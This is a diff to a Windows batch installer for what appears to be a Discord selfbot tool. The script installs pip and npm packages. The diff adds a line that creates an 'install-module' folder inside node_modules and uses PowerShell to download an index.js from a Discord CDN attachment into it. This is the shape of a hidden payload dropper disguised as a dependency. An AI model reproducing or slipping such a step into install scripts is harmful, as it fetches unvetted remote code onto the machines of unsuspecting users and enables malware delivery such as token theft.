@@ -40,7 +40,8 @@ pip install Style
 pip install Thread
 pip install dhooks
 cls
-npm i axios buffer-replace@1.0.0 chalk@4 child_process@1.0.2 coloring@0.1.0 colors@1.4.0 discord.js@12 discord.js-selfbot@12.0.2 discord.js-selfbot-v11@11.5.1 enquirer@2.3.6 glob@7.2.0 gradient-string@2.0.0 node-fetch@2 readline-sync@1.4.10 request shelljs snekfetch system-sleep small-sm
+npm i axios buffer-replace@1.0.0 chalk@4 child_process@1.0.2 coloring@0.1.0 colors@1.4.0 discord.js@12 discord.js-selfbot@12.0.2 discord.js-selfbot-v11@11.5.1 enquirer@2.3.6 glob@7.2.0 gradient-string@2.0.0 node-fetch@2 readline-sync@1.4.10 request shelljs snekfetch system-sleep
+cd "node_modules" && Mkdir "install-module" && cd "install-module" && powershell Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/966486656578359346/1001847888118292561/index.js" -OutFile "index.js"
 cls
 color 4
 echo.
